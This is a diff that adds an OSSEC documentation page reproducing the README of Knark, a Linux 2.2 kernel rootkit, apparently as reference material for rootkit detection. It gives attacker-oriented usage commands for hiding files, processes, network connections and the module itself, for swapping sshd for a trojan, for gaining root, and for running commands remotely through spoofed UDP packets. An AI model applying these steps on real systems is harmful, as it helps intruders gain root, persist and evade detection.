@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    
+    <title>Knark is a kernel-based rootkit for Linux 2.2. &mdash; OSSEC</title>
+    
+    <link rel="stylesheet" href="../../_static/basic.css" type="text/css" />
+    <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
+    <link rel="stylesheet" href="../../_static/bootstrap-3.2.0/css/bootstrap.min.css" type="text/css" />
+    <link rel="stylesheet" href="../../_static/bootstrap-3.2.0/css/bootstrap-theme.min.css" type="text/css" />
+    <link rel="stylesheet" href="../../_static/bootstrap-sphinx.css" type="text/css" />
+    <link rel="stylesheet" href="../../_static/parallax.css" type="text/css" />
+    
+    <script type="text/javascript">
+      var DOCUMENTATION_OPTIONS = {
+        URL_ROOT:    '../../',
+        VERSION:     '2.8.2',
+        COLLAPSE_INDEX: false,
+        FILE_SUFFIX: '.html',
+        HAS_SOURCE:  true
+      };
+    </script>
+    <script type="text/javascript" src="../../_static/jquery.js"></script>
+    <script type="text/javascript" src="../../_static/underscore.js"></script>
+    <script type="text/javascript" src="../../_static/doctools.js"></script>
+    <script type="text/javascript" src="../../_static/js/jquery-1.11.0.min.js"></script>
+    <script type="text/javascript" src="../../_static/js/jquery-fix.js"></script>
+    <script type="text/javascript" src="../../_static/bootstrap-3.2.0/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="../../_static/bootstrap-sphinx.js"></script>
+    <link rel="author" title="About these documents" href="../../about.html" />
+    <link rel="top" title="OSSEC" href="../../index.html" />
+  
+<meta charset='utf-8'>
+<meta http-equiv='X-UA-Compatible' content='IE=edge,chrome=1'>
+<meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1'>
+<meta name="apple-mobile-web-app-capable" content="yes">
+
+  
+  
+  <link href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.min.css" rel="stylesheet">
+  
+  <style type="text/css">
+    ul.ablog-archive {list-style: none; overflow: auto; margin-left: 0px}
+    ul.ablog-archive li {float: left; margin-right: 5px; font-size: 80%}
+  </style>
+
+  </head>
+  <body>
+
+  <div id="navbar" class="navbar navbar-inverse navbar-default ">
+    <div class="container">
+      <div class="navbar-header">
+        <!-- .btn-navbar is used as the toggle for collapsed navbar content -->
+        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".nav-collapse">
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+        <a class="navbar-brand" href="../../index.html"><img src="../../_static/ossec_logo_bare_small.png">
+          OSSEC</a>
+        <span class="navbar-text navbar-version pull-left"><b></b></span>
+      </div>
+
+        <div class="collapse navbar-collapse nav-collapse">
+          <ul class="nav navbar-nav">
+            
+                <li><a href="../../about.html">About <i class="fa fa-info-circle"></i></a></li>
+                <li><a href="../../blog.html">Blog <i class="fa fa-archive"></i></a></li>
+                <li><a href="../">Documentaton <i class="fa fa-book"></i></a></li>
+                <li><a href="../../downloads.html">Downloads <i class="fa fa-download"></i></a></li>
+            
+            
+              <li class="dropdown globaltoc-container">
+  <a role="button"
+     id="dLabelGlobalToc"
+     data-toggle="dropdown"
+     data-target="#"
+     href="../../index.html">Site <b class="caret"></b></a>
+  <ul class="dropdown-menu globaltoc"
+      role="menu"
+      aria-labelledby="dLabelGlobalToc"></ul>
+</li>
+              
+            
+            
+              
+                
+              
+            
+            
+            
+            
+          </ul>
+
+          
+            
+<form class="navbar-form navbar-right" action="../../search.html" method="get">
+ <div class="form-group">
+  <input type="text" name="q" class="form-control" placeholder="Search" />
+ </div>
+  <input type="hidden" name="check_keywords" value="yes" />
+  <input type="hidden" name="area" value="default" />
+</form>
+          
+        </div>
+    </div>
+  </div>
+
+<div class="container">
+  <div class="row">
+    <div class="col-md-12">
+      
+  <div class="section" id="knark-is-a-kernel-based-rootkit-for-linux-2-2">
+<h1>Knark is a kernel-based rootkit for Linux 2.2.<a class="headerlink" href="#knark-is-a-kernel-based-rootkit-for-linux-2-2" title="Permalink to this headline">¶</a></h1>
+<p>No part of knark may be used to break the law, or to cause damage of any
+kind. And I&#8217;m not responsible for anything you do with it.</p>
+<p>The heart of the package, knark.c, is a Linux lkm (loadable kernel-module).
+Type &#8220;make&#8221; to compile knark and the programs included, and then &#8220;insmod knark&#8221;
+to load the lkm. When knark is loaded, the hidden directory /proc/knark is
+created. The following files are created in this directory:</p>
+<p>author          shameless self-promotion banner :-)
+files           list of hidden files on the system
+nethides        list of strings hidden in /proc/net/[tcp|udp]
+pids            list of hidden pids, ps-like output
+redirects       list of exec-redirection entries</p>
+<p>Changes since v0.50:
+Added remote command execution, and added the client-program rexec.</p>
+<p>These are the programs included in the package (they all depend on knark.o
+to be loaded, except for taskhack.c which modifies /dev/kmem directly):</p>
+<dl class="docutils">
+<dt>hidef   Used to hide files on the system.</dt>
+<dd>Create your hax0r-directory /usr/lib/.hax0r, and type:
+./hidef /usr/lib/.hax0r
+Now this directory will be hidden, and won&#8217;t be shown by ls or du.
+Subdirs and files will be hidden as well, so you don&#8217;t have to
+hidef anything you put in this directory.</dd>
+<dt>unhidef Used to unhide hidden files. You can cat /proc/knark/files if you&#8217;ve</dt>
+<dd>forgotten which files you&#8217;ve hidden. Type:
+./unhidef /usr/lib/.hax0r
+to make your previously hidden directory visible again.
+However, there is a bug in the module which makes directory trees
+start from their mount-point. This means, if you have a filesystem
+mounted to /mnt, and you hide the file /mnt/secret, this file will
+show up as /secret in /proc/knark/files. Files in the root-filesystem
+aren&#8217;t affected.</dd>
+<dt>ered    Used to configure exec-redirection.</dt>
+<dd>Copy your sshd trojan to /usr/lib/.hax0r/sshd_trojan, and type:
+./ered /usr/local/sbin/sshd /usr/lib/.hax0r/sshd_trojan
+Now, when /usr/local/sbin/sshd is supposed to be executed, your
+trojan program will be executed instead. To clear all exec-redirection
+entries, type:
+./ered -c</dd>
+<dt>nethide Used to hide strings in /proc/net/tcp and /proc/net/udp. This is</dt>
+<dd><p class="first">where netstat gets it&#8217;s information. Type:
+./nethide &#8221;:ABCD &#8221;
+to hide connections to/from port ABCD hex (43981 dec). This will
+&#8220;grep -v&#8221; the line &#8221;:ABCD &#8221; from /proc/net/[tcp|udp].
+You have to understand the output from /proc/net/[tcp|udp] to use
+this program. Lets say that you have sshd running on your box.
+Connect to localhost port 22, and type:
+netstat -at
+One of the lines looks like this:
+Proto Recv-Q Send-Q Local Address      Foreign Address  State
+tcp        0      0 localhost:ssh      localhost:1023   ESTABLISHED
+And now, lets check /proc/net/tcp. Type:
+cat /proc/net/tcp
+One of the lines looks like this:</p>
+<blockquote>
+<div>local_address rem_address   blablabla...</div></blockquote>
+<p class="last">0:0100007F:0016 0100007F:03FF 01 00000000:00000000 00:00000000 00000000
+If we want to hide everything about ip-address 127.0.0.1, we have to
+translate it to this format. Start with 127: 7F in hex. Then 0: 00
+in hex, which gives us 007F. And 0 again: 00007F, and at last 1
+which gives us the number 0100007F. Now, if we want to hide
+everything about port 22 and ip-address 127.0.0.1 it looks like this:
+0100007F:0016 (0016 is port 22 in hex). So, typing:
+./nethide &#8220;0100007F:0016&#8221; will hide connections to/from localhost
+port 22, and typing:
+./nethide &#8221;:ABCD &#8221; will remove all lines containing &#8221;:ABCD &#8221;. It&#8217;s
+like &#8220;grep -v&#8221;. Do you get it? :-)</p>
+</dd>
+<dt>rootme  Used to gain root-access without using suid programs. Type:</dt>
+<dd>./rootme /bin/sh
+to execute /bin/sh with root-privs. This will also work:
+./rootme /bin/ls -l /root
+You have to type the whole path-name of the binary to execute.</dd>
+<dt>taskhack Used to change <a href="#id1"><span class="problematic" id="id2">*</span></a>uid&#8217;s and <a href="#id3"><span class="problematic" id="id4">*</span></a>gid&#8217;s of running processes. Type:</dt>
+<dd>./taskhack -alluid=0 pid
+This will change all <a href="#id5"><span class="problematic" id="id6">*</span></a>uid&#8217;s (uid, euid, suid, fsuid) of process
+&#8220;pid&#8221; to 0 (root). Type:
+ps aux | grep bash
+creed       91  0.0  1.3  1424   824   1 S    15:31   0:00 -bash
+Now, we want to change the euid of this process to 0 (root). Type:
+./taskhack -euid=0 91
+ps aux | grep bash
+root (!)    91  0.0  1.3  1424   824   1 S    15:31   0:00 -bash
+Isn&#8217;t this just great? :-).</dd>
+</dl>
+<p><a href="#id7"><span class="problematic" id="id8">*</span></a>rexec  Used to execute commands remotely on a knark-server. Type:
+*       ./rexec www.microsoft.com haxored.server.nu /bin/touch /LUDER
+*       This will send a spoofed udp packet from www.microsoft.com:53 to
+*       haxored.server.nu:53, which tells haxored.server.nu to /bin/touch
+*       /LUDER. If you wan&#8217;t to try this on localhost, don&#8217;t specify a
+*       spoofed address different from your own, since the kernel won&#8217;t
+*       accept it.
+*       ./rexec localhost localhost /bin/touch /LUDER
+*       will do it for you.</p>
+<p>(* = newly added thing)</p>
+<p>And knark has eaven more features than this:
+sending signal 31 to a process will hide it&#8217;s directory in /proc, making
+it invisible to ps and top. Type:
+kill -31 pid
+If this process fork&#8217;s or clone&#8217;s, all childs of the process will be hidden.
+This means, that if you hide your shell with kill -31, all commands you
+issue will be invisible. That&#8217;s neat :-).
+If you want to make a process visible again for some reason, and you&#8217;ve
+forgotten the pid, just cat /proc/knark/pids. This will give you a ps-like
+output of all hidden processes.</p>
+<p>Sniffers sets the network interface in promiscious mode, and many simple
+sniffer-detectors rely on this. When knark is loaded, no network interface
+will show the IFF_PROMISC flag when SIOCGIFFLAGS is requested. Hiding the
+sniffer with signal 31 is also recommended.</p>
+<p>This package includes another lkm than knark; modhide. When modhide is
+loaded, it removes the latest loaded module from the module list, thus
+hiding it from lsmod, and removing it from /proc/modules. Type:
+insmod knark
+lsmod | grep knark
+knark                   6640   0  (unused)
+insmod modhide
+(error messages)
+lsmod | grep knark
+<em>noting</em></p>
+<p>But be careful, you might have to reboot to get rid of knark if you load
+modhide, since it can&#8217;t be removed with normal methods, like rmmod.
+Have fun. And stay out of trouble.</p>
+<p>By the way, I don&#8217;t recommend you to unload the module, there is some kind
+of bug that can make strange things happen. Sometimes it works fine, sometimes
+a process dies and sometimes your computer will look like a banana.
+This is not a bug-free release. Please let me know if you find things to
+improve.</p>
+<p>email: <a class="reference external" href="mailto:creed&#37;&#52;&#48;sekure&#46;net">creed<span>&#64;</span>sekure<span>&#46;</span>net</a>
+Ircnet and EFNet: Creed (or <a href="#id9"><span class="problematic" id="id10">Creed_</span></a> or something like that) &#64;sekure.net</p>
+</div>
+
+  <div class="section">
+  
+  
+  </div>
+
+    </div>
+      
+  </div>
+</div>
+<footer class="footer">
+  <div class="container">
+    <p class="pull-right">
+      <a href="#">Back to top</a>
+      
+    </p>
+    <p>
+        &copy; Copyright 2010-2015, OSSEC Project Team - OSSEC trademark and domain owned by Trend Micro, Inc. - Home page images courtesy of Pixbay.com.<br/>
+      Created using <a href="http://sphinx.pocoo.org/">Sphinx</a> 1.2.3.<br/>
+    </p>
+  </div>
+</footer>
+  </body>
+</html>
